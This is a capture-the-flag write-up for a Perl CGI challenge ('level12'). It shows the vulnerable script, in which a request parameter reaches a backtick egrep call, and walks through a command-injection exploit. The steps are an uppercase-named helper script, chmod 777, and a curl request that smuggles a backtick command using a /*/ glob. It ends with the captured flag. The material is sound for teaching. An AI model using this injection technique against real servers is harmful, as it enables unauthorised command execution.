We have a pearl file : level12.pl
First we cat the file to see what is inside:

```pearl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1]; --> Assigns the second argument ($_[1]) to the variable $nn.
  $xx = $_[0]; --> Assigns the first argument ($_[0]) to the variable $xx.
  $xx =~ tr/a-z/A-Z/; --> Converts all lowercase letters in $xx to uppercase using the tr function.
  $xx =~ s/\s.*//; --> Removes any whitespace characters followed by any characters after the first whitespace in $xx using the substitution operator s///.
  @output = `egrep "^$xx" /tmp/xd 2>&1`; --> Executes the command egrep "^$xx" /tmp/xd 2>&1 using backticks (`) to capture the output.
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

Like the exerice 4, it is a server, we can send request with curl.
The important part is in sub t, in the @output line : egrep is used so we can inject some script to get back the flag.
We understand that only the first parameter matters ($xx) and this parameter will be converted into capital letters.
So with this informations, we have to create a script with a name in capital letters, in this script, we just have to
call getflag and save the output in a directory that we can use (for example /tmp).

First we create our script CAPTUREFLAG

#!/bin/sh
getflag > /tmp/myflag

Second we give the rights to our script

chmod 777 CAPTUREFLAG

and finally we call a HTTP request with the following parameters
localhost:4646 --> we just copy the port number that we found in the script
x="\`/*/CAPTUREFLAG\`"	--> We use backticks to make egrep execute our script.
						--> We use /*/ to find our script everywhere in the VM because
						our script is in /tmp/CAPTUREFLAG but the script is going to transform in capital letters
						/TMP/CAPTUREFLAG and then never going to find CAPTUREFLAG.

curl localhost:4646?x="\`/*/CAPTUREFLAG\`"

We just have to cat /tmp/myflag --> g1qKMiRpXf53AWhDaU7FEkczr